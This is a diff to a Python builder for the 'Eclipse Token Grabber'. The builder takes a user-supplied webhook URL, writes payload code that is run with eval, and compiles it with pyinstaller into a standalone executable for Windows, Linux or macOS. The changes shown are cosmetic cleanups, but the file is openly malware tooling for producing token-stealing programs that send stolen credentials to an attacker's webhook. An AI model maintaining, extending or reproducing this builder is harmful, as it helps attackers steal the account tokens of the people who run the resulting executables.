@@ -1,7 +1,7 @@
 from os import remove as delete_file, path
 from sys import platform as OS
 from base64 import b64encode
-from argparse import ArgumentParser
+from argparse import ArgumentParser, Namespace
 from subprocess import run, PIPE
 
 
@@ -33,15 +33,12 @@ def build(webhook: str, out_file: str):
     build_file.write(eval_code)
     build_file.close()
 
-    if OS == "linux" or OS == "linux2":
-        # Linux
+    if OS == "linux" or OS == "linux2":  # Linux
         compile_command = ["wine", "/root/.wine/drive_c/users/root/Local Settings/Application Data/Programs/"
                            + "Python/Python38-32/Scripts/pyinstaller.exe"]
-    elif OS == "win32":
-        # Windows
+    elif OS == "win32":  # Windows
         compile_command = ["venv/Scripts/pyinstaller.exe"]
-    elif OS == "darwin":
-        # OSX
+    elif OS == "darwin":  # OSX
         compile_command = ["pyinstaller"]
     else:
         exit("\n[-] OS not supported\n")
@@ -54,7 +51,7 @@ def build(webhook: str, out_file: str):
         if "completed successfully" not in result:
             raise Exception(result.splitlines()[-2])
     except Exception as error:
-        raise exit(f"\n[-] Build Error: {error}")
+        exit(f"\n[-] Build Error: {error}")
 
     try:
         delete_file(out_file+".py")
@@ -63,18 +60,18 @@ def build(webhook: str, out_file: str):
         pass
 
 
-def get_args():
+def get_args() -> Namespace:
     parser = ArgumentParser(description='Eclipse Token Grabber Builder')
     parser.add_argument('-w', '--webhook', help='add your webhook url', default='', required=True)
     parser.add_argument('-o', '--outfile', help='name your executable', default='', required=True)
     return parser.parse_args()
 
 
-def main(args):
+def main(args: Namespace):
     print(TITLE)
     print("\n[+] Building Eclipse Token Grabber, please wait...")
     build(args.webhook, args.outfile)
-    print("\n\n[+] Succesfully Builded Eclipse Token Grabber",
+    print("\n\n[+] Successfully Built!",
           "\n\n[+] You can find it inside the dist directory")
 
 
